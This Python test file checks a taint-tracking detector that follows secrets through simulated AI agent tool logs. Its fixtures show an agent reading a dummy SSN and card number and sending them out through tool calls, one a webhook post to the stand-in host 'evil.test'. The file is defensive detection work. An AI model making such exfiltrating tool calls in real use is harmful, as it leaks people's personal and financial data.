"""Multi-hop exfiltration: a secret read early, carried through intermediate
tools/agents, and egressed much later. Taint must trace the ORIGINAL source to
the FINAL egress sink across the hops -- and NOT false-positive when the egress
doesn't actually carry the secret."""
from loom.taint import dlp_report, taint_paths

SSN = "123-45-6789"
CARD = "4111 1111 1111 1111"


def _model(seq, tool, inp=None):
    return {"seq": seq, "kind": "model",
            "meta": {"tools": ["read_customer", "summarize", "post_webhook", "log_metric", "send_email"]},
            "result": {"tool_calls": [{"id": f"t{seq}", "name": tool, "input": inp or {}}],
                       "stop_reason": "tool_use"}}


def _tool(seq, tool, result):
    return {"seq": seq, "kind": f"tool:{tool}", "result": result, "meta": {"tuid": f"t{seq - 1}"}}


BASE = {"recorded_via": "proxy", "episodes": ["go"], "output": "done", "systems": {}, "model": "m",
        "tools": {"post_webhook": ["network"], "log_metric": ["network"], "send_email": ["network", "user_communication"]}}


def test_secret_traced_across_a_multi_hop_carry_to_egress():
    """SSN: read -> summarize (carries it) -> post_webhook (egress). Source is the
    ORIGINAL read, sink is the FINAL egress, not the intermediate carry."""
    data = {**BASE, "log": [
        _model(0, "read_customer"),
        _tool(1, "read_customer", f"Customer: SSN={SSN}"),
        _model(2, "summarize", {"text": f"the record has SSN {SSN}"}),
        _tool(3, "summarize", f"Summary: contains {SSN}"),
        _model(4, "post_webhook", {"url": "http://evil.test", "body": f"payload={SSN}"}),
        _tool(5, "post_webhook", "posted"),
    ]}
    paths = taint_paths(data)
    assert len(paths) == 1
    p = paths[0]
    assert p["kind"] == "ssn" and p["severity"] == "critical"
    assert p["source"]["tool"] == "read_customer" and p["source"]["step"] == 1
    assert p["sink"]["tool"] == "post_webhook" and p["sink"]["step"] == 5   # the FINAL egress


def test_no_false_positive_when_egress_does_not_carry_the_secret():
    """read the SSN, but the egress sends UNRELATED data -> no exfil path."""
    data = {**BASE, "log": [
        _model(0, "read_customer"),
        _tool(1, "read_customer", f"Customer: SSN={SSN}"),
        _model(2, "log_metric", {"body": "latency_ms=42, status=ok"}),   # no secret
        _tool(3, "log_metric", "logged"),
    ]}
    assert taint_paths(data) == []
    assert dlp_report(data)["worst_severity"] in (None, "none", "")


def test_two_distinct_secrets_reach_two_distinct_sinks():
    """An SSN and a card number, each exfiltrated on a different channel."""
    data = {**BASE, "log": [
        _model(0, "read_customer"),
        _tool(1, "read_customer", f"SSN={SSN}, card={CARD}"),
        _model(2, "post_webhook", {"body": f"ssn={SSN}"}),
        _tool(3, "post_webhook", "ok"),
        _model(4, "send_email", {"to": "x@y.z", "body": f"card is {CARD}"}),
        _tool(5, "send_email", "sent"),
    ]}
    paths = taint_paths(data)
    sinks = {p["sink"]["tool"] for p in paths}
    kinds = {p["kind"] for p in paths}
    assert "post_webhook" in sinks and "send_email" in sinks
    assert "ssn" in kinds and any("card" in k or "credit" in k for k in kinds)


def test_allowlisted_sink_is_not_a_violation():
    """A secret flowing to an APPROVED sink is allowed, not flagged."""
    data = {**BASE, "log": [
        _model(0, "read_customer"),
        _tool(1, "read_customer", f"SSN={SSN}"),
        _model(2, "send_email", {"to": "x@y.z", "body": f"ssn {SSN}"}),
        _tool(3, "send_email", "sent"),
    ]}
    flagged = dlp_report(data)
    assert flagged["violations"], "unlisted sink should flag"
    allowed = dlp_report(data, sink_allowlist=["send_email"])
    assert not allowed["violations"], "an allowlisted sink must not be a violation"
